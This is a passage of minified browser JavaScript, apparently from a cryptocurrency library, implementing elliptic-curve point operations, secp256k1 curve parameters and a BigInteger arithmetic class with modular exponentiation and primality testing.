      n = r.multiply(this.x.subtract(s)).subtract(this.y);
    return new e.PointFp(this.curve, s, n)
  }, e.PointFp.prototype.twice2D = function() {
    if (this.isInfinity()) return this;
    if (0 == this.y.toBigInteger().signum()) return this.curve.getInfinity();
    var t = this.curve.fromBigInteger(BigInteger.valueOf(2)),
      o = this.curve.fromBigInteger(BigInteger.valueOf(3)),
      i = this.x.square().multiply(o).add(this.curve.a).divide(this.y.multiply(t)),
      r = i.square().subtract(this.x.multiply(t)),
      s = i.multiply(this.x.subtract(r)).subtract(this.y);
    return new e.PointFp(this.curve, r, s)
  }, e.PointFp.prototype.multiply2D = function(t) {
    if (this.isInfinity()) return this;
    if (0 == t.signum()) return this.curve.getInfinity();
    var o, r = t,
      e = r.multiply(new BigInteger("3")),
      s = this.negate(),
      n = this;
    for (o = e.bitLength() - 2; 0 < o; --o) {
      n = n.twice();
      var p = e.testBit(o),
        a = r.testBit(o);
      p != a && (n = n.add2D(p ? this : s))
    }
    return n
  }, e.PointFp.prototype.isOnCurve = function() {
    var e = this.getX().toBigInteger(),
      t = this.getY().toBigInteger(),
      o = this.curve.getA().toBigInteger(),
      i = this.curve.getB().toBigInteger(),
      r = this.curve.getQ(),
      s = t.multiply(t).mod(r),
      n = e.multiply(e).multiply(e).add(o.multiply(e)).add(i).mod(r);
    return s.equals(n)
  }, e.PointFp.prototype.toString = function() {
    return "(" + this.getX().toBigInteger().toString() + "," + this.getY().toBigInteger().toString() + ")"
  }, e.PointFp.prototype.validate = function() {
    var e = this.curve.getQ();
    if (this.isInfinity()) throw new Error("Point is at infinity.");
    var t = this.getX().toBigInteger(),
      o = this.getY().toBigInteger();
    if (0 > t.compareTo(BigInteger.ONE) || 0 < t.compareTo(e.subtract(BigInteger.ONE))) throw new Error("x coordinate out of bounds");
    if (0 > o.compareTo(BigInteger.ONE) || 0 < o.compareTo(e.subtract(BigInteger.ONE))) throw new Error("y coordinate out of bounds");
    if (!this.isOnCurve()) throw new Error("Point is not on the curve.");
    if (this.multiply(e).isInfinity()) throw new Error("Point is not a scalar multiple of G.");
    return !0
  }, e.CurveFp = function(t, o, i) {
    this.q = t, this.a = this.fromBigInteger(o), this.b = this.fromBigInteger(i), this.infinity = new e.PointFp(this, null, null), this.reducer = new Barrett(this.q)
  }, e.CurveFp.prototype.getQ = function() {
    return this.q
  }, e.CurveFp.prototype.getA = function() {
    return this.a
  }, e.CurveFp.prototype.getB = function() {
    return this.b
  }, e.CurveFp.prototype.equals = function(e) {
    return !(e != this) || this.q.equals(e.q) && this.a.equals(e.a) && this.b.equals(e.b)
  }, e.CurveFp.prototype.getInfinity = function() {
    return this.infinity
  }, e.CurveFp.prototype.fromBigInteger = function(t) {
    return new e.FieldElementFp(this.q, t)
  }, e.CurveFp.prototype.reduce = function(e) {
    this.reducer.reduce(e)
  }, e.CurveFp.prototype.decodePointHex = function(t) {
    var o = parseInt(t.substr(0, 2), 16);
    switch (o) {
      case 0:
        return this.infinity;
      case 2:
      case 3:
        var i = t.substr(2, t.length - 2),
          r = new BigInteger(i, 16);
        return this.decompressPoint(1 & o, r);
      case 4:
      case 6:
      case 7:
        var s = (t.length - 2) / 2,
          i = t.substr(2, s),
          n = t.substr(s + 2, s);
        return new e.PointFp(this, this.fromBigInteger(new BigInteger(i, 16)), this.fromBigInteger(new BigInteger(n, 16)));
      default:
        return null;
    }
  }, e.CurveFp.prototype.encodePointHex = function(e) {
    if (e.isInfinity()) return "00";
    var t = e.getX().toBigInteger().toString(16),
      i = e.getY().toBigInteger().toString(16),
      r = this.getQ().toString(16).length;
    for (0 != r % 2 && r++; t.length < r;) t = "0" + t;
    for (; i.length < r;) i = "0" + i;
    return "04" + t + i
  }, e.CurveFp.prototype.decompressPoint = function(t, o) {
    var i = this.fromBigInteger(o),
      r = i.multiply(i.square().add(this.getA())).add(this.getB()),
      s = r.sqrt();
    if (null == s) throw new Error("Invalid point compression");
    var n = s.toBigInteger(),
      p = n.testBit(0) ? 1 : 0;
    return p != t && (s = this.fromBigInteger(this.getQ().subtract(n))), new e.PointFp(this, i, s, null, !0)
  }, e.fromHex = function(e) {
    return new BigInteger(e, 16)
  }, e.integerToBytes = function(e, t) {
    var o = e.toByteArrayUnsigned();
    if (t < o.length) o = o.slice(o.length - t);
    else
      for (; t > o.length;) o.unshift(0);
    return o
  }, e.X9Parameters = function(e, t, o, i) {
    this.curve = e, this.g = t, this.n = o, this.h = i
  }, e.X9Parameters.prototype.getCurve = function() {
    return this.curve
  }, e.X9Parameters.prototype.getG = function() {
    return this.g
  }, e.X9Parameters.prototype.getN = function() {
    return this.n
  }, e.X9Parameters.prototype.getH = function() {
    return this.h
  }, e.secNamedCurves = {
    secp256k1: function() {
      var t = e.fromHex("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F"),
        o = BigInteger.ZERO,
        i = e.fromHex("7"),
        r = e.fromHex("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141"),
        s = BigInteger.ONE,
        n = new e.CurveFp(t, o, i),
        p = n.decodePointHex("0479BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8");
      return new e.X9Parameters(n, p, r, s)
    }
  }, e.getSECCurveByName = function(t) {
    return null == e.secNamedCurves[t] ? null : e.secNamedCurves[t]()
  }
}(),
function() {
  function s() {
    return new h(null)
  }

  function e(e, t, o, r, s, p) {
    for (; 0 <= --p;) {
      var a = t * this[e++] + o[r] + s;
      s = Math.floor(a / 67108864), o[r++] = 67108863 & a
    }
    return s
  }

  function t(e, t, o, r, s, p) {
    for (var a = 32767 & t, d = t >> 15; 0 <= --p;) {
      var u = 32767 & this[e],
        y = this[e++] >> 15,
        g = d * u + y * a;
      u = a * u + ((32767 & g) << 15) + o[r] + (1073741823 & s), s = (u >>> 30) + (g >>> 15) + d * y + (s >>> 30), o[r++] = 1073741823 & u
    }
    return s
  }

  function o(e, t, o, r, s, p) {
    for (var a = 16383 & t, d = t >> 14; 0 <= --p;) {
      var u = 16383 & this[e],
        y = this[e++] >> 14,
        g = d * u + y * a;
      u = a * u + ((16383 & g) << 14) + o[r] + s, s = (u >> 28) + (g >> 14) + d * y, o[r++] = 268435455 & u
    }
    return s
  }

  function r(e) {
    return b.charAt(e)
  }

  function n(e, t) {
    var o = B[e.charCodeAt(t)];
    return null == o ? -1 : o
  }

  function p(e) {
    var t = s();
    return t.fromInt(e), t
  }

  function a(e) {
    var i, s = 1;
    return 0 != (i = e >>> 16) && (e = i, s += 16), 0 != (i = e >> 8) && (e = i, s += 8), 0 != (i = e >> 4) && (e = i, s += 4), 0 != (i = e >> 2) && (e = i, s += 2), 0 != (i = e >> 1) && (e = i, s += 1), s
  }

  function d(e) {
    if (0 == e) return -1;
    var t = 0;
    return 0 == (65535 & e) && (e >>= 16, t += 16), 0 == (255 & e) && (e >>= 8, t += 8), 0 == (15 & e) && (e >>= 4, t += 4), 0 == (3 & e) && (e >>= 2, t += 2), 0 == (1 & e) && ++t, t
  }

  function l(e) {
    for (var t = 0; 0 != e;) e &= e - 1, ++t;
    return t
  }

  function i(e, t) {
    return e & t
  }

  function u(e, t) {
    return e | t
  }

  function y(e, t) {
    return e ^ t
  }

  function c(e, t) {
    return e & ~t
  }
  var m, h = window.BigInteger = function e(t, o, i) {
    return this instanceof e ? void(null != t && ("number" == typeof t ? this.fromNumber(t, o, i) : null == o && "string" != typeof t ? this.fromString(t, 256) : this.fromString(t, o))) : new e(t, o, i)
  };
  "Microsoft Internet Explorer" == navigator.appName ? (h.prototype.am = t, m = 30) : "Netscape" != navigator.appName ? (h.prototype.am = e, m = 26) : (h.prototype.am = o, m = 28), h.prototype.DB = m, h.prototype.DM = (1 << m) - 1, h.prototype.DV = 1 << m;
  h.prototype.FV = Math.pow(2, 52), h.prototype.F1 = 52 - m, h.prototype.F2 = 2 * m - 52;
  var g, f, b = "0123456789abcdefghijklmnopqrstuvwxyz",
    B = [];
  for (g = 48, f = 0; 9 >= f; ++f) B[g++] = f;
  for (g = 97, f = 10; 36 > f; ++f) B[g++] = f;
  for (g = 65, f = 10; 36 > f; ++f) B[g++] = f;
  h.prototype.copyTo = function(e) {
    for (var t = this.t - 1; 0 <= t; --t) e[t] = this[t];
    e.t = this.t, e.s = this.s
  }, h.prototype.fromInt = function(e) {
    this.t = 1, this.s = 0 > e ? -1 : 0, 0 < e ? this[0] = e : -1 > e ? this[0] = e + this.DV : this.t = 0
  }, h.prototype.fromString = function(e, t) {
    var o;
    if (16 == t) o = 4;
    else if (8 == t) o = 3;
    else if (256 == t) o = 8;
    else if (2 == t) o = 1;
    else if (32 == t) o = 5;
    else {
      if (4 != t) return void this.fromRadix(e, t);
      o = 2
    }
    this.t = 0, this.s = 0;
    for (var r, s = e.length, p = !1, a = 0; 0 <= --s;) r = 8 == o ? 255 & e[s] : n(e, s), 0 > r ? "-" == e.charAt(s) && (p = !0) : (p = !1, 0 == a ? this[this.t++] = r : a + o > this.DB ? (this[this.t - 1] |= (r & (1 << this.DB - a) - 1) << a, this[this.t++] = r >> this.DB - a) : this[this.t - 1] |= r << a, a += o, a >= this.DB && (a -= this.DB));
    8 == o && 0 != (128 & e[0]) && (this.s = -1, 0 < a && (this[this.t - 1] |= (1 << this.DB - a) - 1 << a)), this.clamp(), p && h.ZERO.subTo(this, this)
  }, h.prototype.clamp = function() {
    for (var e = this.s & this.DM; 0 < this.t && this[this.t - 1] == e;) --this.t
  }, h.prototype.dlShiftTo = function(e, t) {
    var o;
    for (o = this.t - 1; 0 <= o; --o) t[o + e] = this[o];
    for (o = e - 1; 0 <= o; --o) t[o] = 0;
    t.t = this.t + e, t.s = this.s
  }, h.prototype.drShiftTo = function(e, t) {
    for (var o = e; o < this.t; ++o) t[o - e] = this[o];
    t.t = Math.max(this.t - e, 0), t.s = this.s
  }, h.prototype.lShiftTo = function(e, t) {
    var r, s = e % this.DB,
      o = this.DB - s,
      n = Math.floor(e / this.DB),
      p = this.s << s & this.DM;
    for (r = this.t - 1; 0 <= r; --r) t[r + n + 1] = this[r] >> o | p, p = (this[r] & (1 << o) - 1) << s;
    for (r = n - 1; 0 <= r; --r) t[r] = 0;
    t[n] = p, t.t = this.t + n + 1, t.s = this.s, t.clamp()
  }, h.prototype.rShiftTo = function(e, t) {
    t.s = this.s;
    var r = Math.floor(e / this.DB);
    if (r >= this.t) return void(t.t = 0);
    var o = e % this.DB,
      s = this.DB - o,
      n = (1 << o) - 1;
    t[0] = this[r] >> o;
    for (var p = r + 1; p < this.t; ++p) t[p - r - 1] |= (this[p] & n) << s, t[p - r] = this[p] >> o;
    0 < o && (t[this.t - r - 1] |= (this.s & n) << s), t.t = this.t - r, t.clamp()
  }, h.prototype.subTo = function(e, t) {
    for (var o = 0, r = 0, s = Math.min(e.t, this.t); s > o;) r += this[o] - e[o], t[o++] = r & this.DM, r >>= this.DB;
    if (e.t < this.t) {
      for (r -= e.s; o < this.t;) r += this[o], t[o++] = r & this.DM, r >>= this.DB;
      r += this.s
    } else {
      for (r += this.s; o < e.t;) r -= e[o], t[o++] = r & this.DM, r >>= this.DB;
      r -= e.s
    }
    t.s = 0 > r ? -1 : 0, -1 > r ? t[o++] = this.DV + r : 0 < r && (t[o++] = r), t.t = o, t.clamp()
  }, h.prototype.multiplyTo = function(e, t) {
    var r = this.abs(),
      o = e.abs(),
      s = r.t;
    for (t.t = s + o.t; 0 <= --s;) t[s] = 0;
    for (s = 0; s < o.t; ++s) t[s + r.t] = r.am(0, o[s], t, s, 0, r.t);
    t.s = 0, t.clamp(), this.s != e.s && h.ZERO.subTo(t, t)
  }, h.prototype.squareTo = function(e) {
    for (var t = this.abs(), o = e.t = 2 * t.t; 0 <= --o;) e[o] = 0;
    for (o = 0; o < t.t - 1; ++o) {
      var r = t.am(o, t[o], e, 2 * o, 0, 1);
      (e[o + t.t] += t.am(o + 1, 2 * t[o], e, 2 * o + 1, r, t.t - o - 1)) >= t.DV && (e[o + t.t] -= t.DV, e[o + t.t + 1] = 1)
    }
    0 < e.t && (e[e.t - 1] += t.am(o, t[o], e, 2 * o, 0, 1)), e.s = 0, e.clamp()
  }, h.prototype.divRemTo = function(o, n, p) {
    var l = o.abs();
    if (!(0 >= l.t)) {
      var u = this.abs();
      if (u.t < l.t) return null != n && n.fromInt(0), void(null != p && this.copyTo(p));
      null == p && (p = s());
      var c = s(),
        d = this.s,
        y = o.s,
        m = this.DB - a(l[l.t - 1]);
      0 < m ? (l.lShiftTo(m, c), u.lShiftTo(m, p)) : (l.copyTo(c), u.copyTo(p));
      var g = c.t,
        f = c[g - 1];
      if (0 != f) {
        var b = f * (1 << this.F1) + (1 < g ? c[g - 2] >> this.F2 : 0),
          B = this.FV / b,
          F = (1 << this.F1) / b,
          T = 1 << this.F2,
          e = p.t,
          v = e - g,
          C = null == n ? s() : n;
        for (c.dlShiftTo(v, C), 0 <= p.compareTo(C) && (p[p.t++] = 1, p.subTo(C, p)), h.ONE.dlShiftTo(g, C), C.subTo(c, c); c.t < g;) c[c.t++] = 0;
        for (; 0 <= --v;) {
          var t = p[--e] == f ? this.DM : Math.floor(p[e] * B + (p[e - 1] + T) * F);
          if ((p[e] += c.am(0, t, p, v, 0, g)) < t)
            for (c.dlShiftTo(v, C), p.subTo(C, p); p[e] < --t;) p.subTo(C, p)
        }
        null != n && (p.drShiftTo(g, n), d != y && h.ZERO.subTo(n, n)), p.t = g, p.clamp(), 0 < m && p.rShiftTo(m, p), 0 > d && h.ZERO.subTo(p, p)
      }
    }
  }, h.prototype.invDigit = function() {
    if (1 > this.t) return 0;
    var e = this[0];
    if (0 == (1 & e)) return 0;
    var t = 3 & e;
    return t = 15 & t * (2 - (15 & e) * t), t = 255 & t * (2 - (255 & e) * t), t = 65535 & t * (2 - (65535 & (65535 & e) * t)), t = t * (2 - e * t % this.DV) % this.DV, 0 < t ? this.DV - t : -t
  }, h.prototype.isEven = function() {
    return 0 == (0 < this.t ? 1 & this[0] : this.s)
  }, h.prototype.exp = function(o, e) {
    if (4294967295 < o || 1 > o) return h.ONE;
    var n = s(),
      p = s(),
      d = e.convert(this),
      l = a(o) - 1;
    for (d.copyTo(n); 0 <= --l;)
      if (e.sqrTo(n, p), 0 < (o & 1 << l)) e.mulTo(p, d, n);
      else {
        var u = n;
        n = p, p = u
      } return e.revert(n)
  }, h.prototype.toString = function(e) {
    if (0 > this.s) return "-" + this.negate().toString(e);
    var t;
    if (16 == e) t = 4;
    else if (8 == e) t = 3;
    else if (2 == e) t = 1;
    else if (32 == e) t = 5;
    else {
      if (4 != e) return this.toRadix(e);
      t = 2
    }
    var o, s = (1 << t) - 1,
      n = !1,
      a = "",
      d = this.t,
      l = this.DB - d * this.DB % t;
    if (0 < d--)
      for (l < this.DB && 0 < (o = this[d] >> l) && (n = !0, a = r(o)); 0 <= d;) t > l ? (o = (this[d] & (1 << l) - 1) << t - l, o |= this[--d] >> (l += this.DB - t)) : (o = this[d] >> (l -= t) & s, 0 >= l && (l += this.DB, --d)), 0 < o && (n = !0), n && (a += r(o));
    return n ? a : "0"
  }, h.prototype.negate = function() {
    var e = s();
    return h.ZERO.subTo(this, e), e
  }, h.prototype.abs = function() {
    return 0 > this.s ? this.negate() : this
  }, h.prototype.compareTo = function(e) {
    var t = this.s - e.s;
    if (0 != t) return t;
    var o = this.t;
    if (t = o - e.t, 0 != t) return 0 > this.s ? -t : t;
    for (; 0 <= --o;)
      if (0 != (t = this[o] - e[o])) return t;
    return 0
  }, h.prototype.bitLength = function() {
    return 0 >= this.t ? 0 : this.DB * (this.t - 1) + a(this[this.t - 1] ^ this.s & this.DM)
  }, h.prototype.mod = function(e) {
    var t = s();
    return this.abs().divRemTo(e, null, t), 0 > this.s && 0 < t.compareTo(h.ZERO) && e.subTo(t, t), t
  }, h.prototype.modPowInt = function(t, e) {
    var i;
    return i = 256 > t || e.isEven() ? new S(e) : new A(e), this.exp(t, i)
  }, h.ZERO = p(0), h.ONE = p(1);
  var F = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563, 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631, 641, 643, 647, 653, 659, 661, 673, 677, 683, 691, 701, 709, 719, 727, 733, 739, 743, 751, 757, 761, 769, 773, 787, 797, 809, 811, 821, 823, 827, 829, 839, 853, 857, 859, 863, 877, 881, 883, 887, 907, 911, 919, 929, 937, 941, 947, 953, 967, 971, 977, 983, 991, 997],
    T = 67108864 / F[F.length - 1];
  h.prototype.chunkSize = function(e) {
    return Math.floor(Math.LN2 * this.DB / Math.log(e))
  }, h.prototype.toRadix = function(e) {
    if (null == e && (e = 10), 0 == this.signum() || 2 > e || 36 < e) return "0";
    var t = this.chunkSize(e),
      o = Math.pow(e, t),
      i = p(o),
      n = s(),
      a = s(),
      d = "";
    for (this.divRemTo(i, n, a); 0 < n.signum();) d = (o + a.intValue()).toString(e).substr(1) + d, n.divRemTo(i, n, a);
    return a.intValue().toString(e) + d
  }, h.prototype.fromRadix = function(e, t) {
    this.fromInt(0), null == t && (t = 10);
    for (var r, s = this.chunkSize(t), p = Math.pow(t, s), a = !1, l = 0, u = 0, c = 0; c < e.length; ++c) r = n(e, c), 0 > r ? "-" == e.charAt(c) && 0 == this.signum() && (a = !0) : (u = t * u + r, ++l >= s && (this.dMultiply(p), this.dAddOffset(u, 0), l = 0, u = 0));
    0 < l && (this.dMultiply(Math.pow(t, l)), this.dAddOffset(u, 0)), a && h.ZERO.subTo(this, this)
  }, h.prototype.fromNumber = function(e, i, o) {
    if (!("number" == typeof i)) {
      var r = [],
        s = 7 & e;
      r.length = (e >> 3) + 1, i.nextBytes(r), 0 < s ? r[0] &= (1 << s) - 1 : r[0] = 0, this.fromString(r, 256)
    } else if (2 > e) this.fromInt(1);
    else
      for (this.fromNumber(e, o), this.testBit(e - 1) || this.bitwiseTo(h.ONE.shiftLeft(e - 1), u, this), this.isEven() && this.dAddOffset(1, 0); !this.isProbablePrime(i);) this.dAddOffset(2, 0), this.bitLength() > e && this.subTo(h.ONE.shiftLeft(e - 1), this)
  }, h.prototype.bitwiseTo = function(e, t, o) {
    var r, s, n = Math.min(e.t, this.t);
    for (r = 0; n > r; ++r) o[r] = t(this[r], e[r]);
    if (e.t < this.t) {
      for (s = e.s & this.DM, r = n; r < this.t; ++r) o[r] = t(this[r], s);
      o.t = this.t
    } else {
      for (s = this.s & this.DM, r = n; r < e.t; ++r) o[r] = t(s, e[r]);
      o.t = e.t
    }
    o.s = t(this.s, e.s), o.clamp()
  }, h.prototype.changeBit = function(e, t) {
    var o = h.ONE.shiftLeft(e);
    return this.bitwiseTo(o, t, o), o
  }, h.prototype.addTo = function(e, t) {
    for (var o = 0, r = 0, s = Math.min(e.t, this.t); s > o;) r += this[o] + e[o], t[o++] = r & this.DM, r >>= this.DB;
    if (e.t < this.t) {
      for (r += e.s; o < this.t;) r += this[o], t[o++] = r & this.DM, r >>= this.DB;
      r += this.s
    } else {
      for (r += this.s; o < e.t;) r += e[o], t[o++] = r & this.DM, r >>= this.DB;
      r += e.s
    }
    t.s = 0 > r ? -1 : 0, 0 < r ? t[o++] = r : -1 > r && (t[o++] = this.DV + r), t.t = o, t.clamp()
  }, h.prototype.dMultiply = function(e) {
    this[this.t] = this.am(0, e - 1, this, 0, 0, this.t), ++this.t, this.clamp()
  }, h.prototype.dAddOffset = function(e, t) {
    if (0 != e) {
      for (; this.t <= t;) this[this.t++] = 0;
      for (this[t] += e; this[t] >= this.DV;) this[t] -= this.DV, ++t >= this.t && (this[this.t++] = 0), ++this[t]
    }
  }, h.prototype.multiplyLowerTo = function(e, t, s) {
    var r = Math.min(this.t + e.t, t);
    for (s.s = 0, s.t = r; 0 < r;) s[--r] = 0;
    var n;
    for (n = s.t - this.t; n > r; ++r) s[r + this.t] = this.am(0, e[r], s, r, 0, this.t);
    for (n = Math.min(e.t, t); n > r; ++r) this.am(0, e[r], s, r, 0, t - r);
    s.clamp()
  }, h.prototype.multiplyUpperTo = function(e, t, o) {
    --t;
    var r = o.t = this.t + e.t - t;
    for (o.s = 0; 0 <= --r;) o[r] = 0;
    for (r = Math.max(t - this.t, 0); r < e.t; ++r) o[this.t + r - t] = this.am(t - r, e[r], o, 0, 0, this.t + r - t);
    o.clamp(), o.drShiftTo(1, o)
  }, h.prototype.modInt = function(e) {
    if (0 >= e) return 0;
    var t = this.DV % e,
      o = 0 > this.s ? e - 1 : 0;
    if (0 < this.t)
      if (0 == t) o = this[0] % e;
      else
        for (var s = this.t - 1; 0 <= s; --s) o = (t * o + this[s]) % e;
    return o
  }, h.prototype.millerRabin = function(e) {
    var o = this.subtract(h.ONE),
      n = o.getLowestSetBit();
    if (0 >= n) return !1;
    var p = o.shiftRight(n);
    e = e + 1 >> 1, e > F.length && (e = F.length);
    for (var r = s(), a = 0; e > a; ++a) {
      r.fromInt(F[Math.floor(Math.random() * F.length)]);
      var l = r.modPow(p, this);
      if (0 != l.compareTo(h.ONE) && 0 != l.compareTo(o)) {
        for (var u = 1; u++ < n && 0 != l.compareTo(o);)
          if (l = l.modPowInt(2, this), 0 == l.compareTo(h.ONE)) return !1;
        if (0 != l.compareTo(o)) return !1
      }
    }
    return !0
  }, h.prototype.clone = function() {
    var e = s();
    return this.copyTo(e), e
  }, h.prototype.intValue = function() {
    if (0 > this.s) {
      if (1 == this.t) return this[0] - this.DV;
      if (0 == this.t) return -1
    } else {
      if (1 == this.t) return this[0];
      if (0 == this.t) return 0
    }
    return (this[1] & (1 << 32 - this.DB) - 1) << this.DB | this[0]
  }, h.prototype.byteValue = function() {
    return 0 == this.t ? this.s : this[0] << 24 >> 24
  }, h.prototype.shortValue = function() {
    return 0 == this.t ? this.s : this[0] << 16 >> 16
  }, h.prototype.signum = function() {
    return 0 > this.s ? -1 : 0 >= this.t || 1 == this.t && 0 >= this[0] ? 0 : 1
  }, h.prototype.toByteArray = function() {
    var e = this.t,
      t = [];
    t[0] = this.s;
    var r, s = this.DB - e * this.DB % 8,
      n = 0;
    if (0 < e--)
      for (s < this.DB && (r = this[e] >> s) != (this.s & this.DM) >> s && (t[n++] = r | this.s << this.DB - s); 0 <= e;) 8 > s ? (r = (this[e] & (1 << s) - 1) << 8 - s, r |= this[--e] >> (s += this.DB - 8)) : (r = 255 & this[e] >> (s -= 8), 0 >= s && (s += this.DB, --e)), 0 != (128 & r) && (r |= -256), 0 == n && (128 & this.s) != (128 & r) && ++n, (0 < n || r != this.s) && (t[n++] = r);
    return t
  }, h.prototype.equals = function(e) {
    return 0 == this.compareTo(e)
  }, h.prototype.min = function(e) {
    return 0 > this.compareTo(e) ? this : e
  }, h.prototype.max = function(e) {
    return 0 < this.compareTo(e) ? this : e
  }, h.prototype.and = function(e) {
    var t = s();
    return this.bitwiseTo(e, i, t), t
  }, h.prototype.or = function(e) {
    var t = s();
    return this.bitwiseTo(e, u, t), t
  }, h.prototype.xor = function(e) {
    var t = s();
    return this.bitwiseTo(e, y, t), t
  }, h.prototype.andNot = function(e) {
    var t = s();
    return this.bitwiseTo(e, c, t), t
  }, h.prototype.not = function() {
    for (var e = s(), t = 0; t < this.t; ++t) e[t] = this.DM & ~this[t];
    return e.t = this.t, e.s = ~this.s, e
  }, h.prototype.shiftLeft = function(e) {
    var t = s();
    return 0 > e ? this.rShiftTo(-e, t) : this.lShiftTo(e, t), t
  }, h.prototype.shiftRight = function(e) {
    var t = s();
    return 0 > e ? this.lShiftTo(-e, t) : this.rShiftTo(e, t), t
  }, h.prototype.getLowestSetBit = function() {
    for (var e = 0; e < this.t; ++e)
      if (0 != this[e]) return e * this.DB + d(this[e]);
    return 0 > this.s ? this.t * this.DB : -1
  }, h.prototype.bitCount = function() {
    for (var e = 0, t = this.s & this.DM, o = 0; o < this.t; ++o) e += l(this[o] ^ t);
    return e
  }, h.prototype.testBit = function(e) {
    var t = Math.floor(e / this.DB);
    return t >= this.t ? 0 != this.s : 0 != (this[t] & 1 << e % this.DB)
  }, h.prototype.setBit = function(e) {
    return this.changeBit(e, u)
  }, h.prototype.clearBit = function(e) {
    return this.changeBit(e, c)
  }, h.prototype.flipBit = function(e) {
    return this.changeBit(e, y)
  }, h.prototype.add = function(e) {
    var t = s();
    return this.addTo(e, t), t
  }, h.prototype.subtract = function(e) {
    var t = s();
    return this.subTo(e, t), t
  }, h.prototype.multiply = function(e) {
    var t = s();
    return this.multiplyTo(e, t), t
  }, h.prototype.divide = function(e) {
    var t = s();
    return this.divRemTo(e, t, null), t
  }, h.prototype.remainder = function(e) {
    var t = s();
    return this.divRemTo(e, null, t), t
  }, h.prototype.divideAndRemainder = function(e) {
    var t = s(),
      o = s();
    return this.divRemTo(e, t, o), [t, o]
  }, h.prototype.modPow = function(o, e) {
    var l, c, m = o.bitLength(),
      h = p(1);
    if (0 >= m) return h;
    l = 18 > m ? 1 : 48 > m ? 3 : 144 > m ? 4 : 768 > m ? 5 : 6, c = 8 > m ? new S(e) : e.isEven() ? new E(e) : new A(e);
    var b = [],
      g = 3,
      B = l - 1,
      d = (1 << l) - 1;
    if (b[1] = c.convert(this), 1 < l) {
      var y = s();
      for (c.sqrTo(b[1], y); d >= g;) b[g] = s(), c.mulTo(y, b[g - 2], b[g]), g += 2
    }
    var v, P, w = o.t - 1,
      x = !0,
      D = s();
    for (m = a(o[w]) - 1; 0 <= w;) {
      for (m >= B ? v = o[w] >> m - B & d : (v = (o[w] & (1 << m + 1) - 1) << B - m, 0 < w && (v |= o[w - 1] >> this.DB + m - B)), g = l; 0 == (1 & v);) v >>= 1, --g;
      if (0 > (m -= g) && (m += this.DB, --w), x) b[v].copyTo(h), x = !1;
      else {
        for (; 1 < g;) c.sqrTo(h, D), c.sqrTo(D, h), g -= 2;
        0 < g ? c.sqrTo(h, D) : (P = h, h = D, D = P), c.mulTo(D, b[v], h)
      }
      for (; 0 <= w && 0 == (o[w] & 1 << m);) c.sqrTo(h, D), P = h, h = D, D = P, 0 > --m && (m = this.DB - 1, --w)
    }
    return c.revert(h)
  }, h.prototype.modInverse = function(e) {
    var t = e.isEven();
    if (0 === this.signum()) throw new Error("division by zero");
    if (this.isEven() && t || 0 == e.signum()) return h.ZERO;
    for (var o = e.clone(), i = this.clone(), r = p(1), s = p(0), n = p(0), a = p(1); 0 != o.signum();) {
      for (; o.isEven();) o.rShiftTo(1, o), t ? (r.isEven() && s.isEven() || (r.addTo(this, r), s.subTo(e, s)), r.rShiftTo(1, r)) : s.isEven() || s.subTo(e, s), s.rShiftTo(1, s);
      for (; i.isEven();) i.rShiftTo(1, i), t ? (n.isEven() && a.isEven() || (n.addTo(this, n), a.subTo(e, a)), n.rShiftTo(1, n)) : a.isEven() || a.subTo(e, a), a.rShiftTo(1, a);
      0 <= o.compareTo(i) ? (o.subTo(i, o), t && r.subTo(n, r), s.subTo(a, s)) : (i.subTo(o, i), t && n.subTo(r, n), a.subTo(s, a))
    }
    if (0 != i.compareTo(h.ONE)) return h.ZERO;
    for (; 0 <= a.compareTo(e);) a.subTo(e, a);
    for (; 0 > a.signum();) a.addTo(e, a);
    return a
  }, h.prototype.pow = function(t) {
    return this.exp(t, new v)
  }, h.prototype.gcd = function(e) {
    var r = 0 > this.s ? this.negate() : this.clone(),
      s = 0 > e.s ? e.negate() : e.clone();
    if (0 > r.compareTo(s)) {
      var n = r;
      r = s, s = n
    }
    var t = r.getLowestSetBit(),
      p = s.getLowestSetBit();
    if (0 > p) return r;
    for (p > t && (p = t), 0 < p && (r.rShiftTo(p, r), s.rShiftTo(p, s)); 0 < r.signum();) 0 < (t = r.getLowestSetBit()) && r.rShiftTo(t, r), 0 < (t = s.getLowestSetBit()) && s.rShiftTo(t, s), 0 <= r.compareTo(s) ? (r.subTo(s, r), r.rShiftTo(1, r)) : (s.subTo(r, s), s.rShiftTo(1, s));
    return 0 < p && s.lShiftTo(p, s), s
  }, h.prototype.isProbablePrime = function(e) {
    var t, r = this.abs();
    if (1 == r.t && r[0] <= F[F.length - 1]) {
      for (t = 0; t < F.length; ++t)
        if (r[0] == F[t]) return !0;
      return !1
    }
    if (r.isEven()) return !1;
    for (t = 1; t < F.length;) {
      for (var o = F[t], s = t + 1; s < F.length && T > o;) o *= F[s++];
      for (o = r.modInt(o); s > t;)
        if (0 == o % F[t++]) return !1
    }
    return r.millerRabin(e)
  }, h.prototype.square = function() {
    var e = s();
    return this.squareTo(e), e
  }, h.valueOf = p, h.prototype.toByteArrayUnsigned = function() {
    var e = this.abs().toByteArray();
    return e.length ? (0 == e[0] && (e = e.slice(1)), e.map(function(e) {
      return 0 > e ? e + 256 : e
    })) : e
  }, h.fromByteArrayUnsigned = function(e) {
    return e.length ? new h(128 & e[0] ? [0].concat(e) : e) : e.valueOf(0)
  }, h.prototype.toByteArraySigned = function() {
    var e = this.abs().toByteArrayUnsigned(),
      t = 0 > this.compareTo(h.ZERO);
    return t ? 128 & e[0] ? e.unshift(128) : e[0] |= 128 : 128 & e[0] && e.unshift(0), e
  }, h.fromByteArraySigned = function(e) {
